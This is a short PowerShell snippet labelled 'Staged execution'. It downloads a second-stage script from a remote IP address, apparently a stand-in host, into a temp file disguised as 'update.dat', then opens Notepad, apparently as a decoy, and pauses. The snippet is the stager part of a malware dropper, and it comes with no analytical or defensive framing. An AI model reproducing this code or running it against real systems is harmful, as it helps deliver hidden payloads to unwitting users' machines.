
<# Staged execution #> $RemoteUrl = "https://198.51.100.135/updater.ps1"; $Stage2Path = "$env:TEMP\update.dat"; Invoke-WebRequest -Uri $RemoteUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "notepad.exe"; Start-Sleep -Seconds 26
